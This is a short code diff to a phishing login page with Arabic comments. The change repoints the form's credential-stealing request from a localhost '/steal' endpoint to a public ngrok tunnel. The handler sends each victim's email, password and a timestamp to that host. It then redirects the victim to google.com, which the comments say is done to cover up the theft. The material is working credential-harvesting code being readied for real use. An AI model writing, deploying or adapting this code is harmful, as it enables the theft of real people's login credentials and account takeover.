@@ -21,14 +21,14 @@
 
       console.log("Sending data:", { email, password });
 
-      fetch('http://localhost:3000/steal', {  // غير الـ IP لـ IP جهازك اللي شغال عليه السيرفر
+      fetch('https://77b7dc87561a.ngrok-free.app/steal', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ email, password, timestamp: new Date().toISOString() })
       }).catch(err => console.error('Fetch error:', err));
 
-      // توجيه المستخدم لصفحة وهمية أو حقيقية لتغطية عملية الاختراق
-      window.location.href = "https://www.google.com"; // استبدلها بأي رابط تاني لو حابب
+      // توجيه المستخدم لصفحة وهمية أو حقيقية لتغطية العملية
+      window.location.href = "https://www.google.com";
     });
   </script>
 </body>
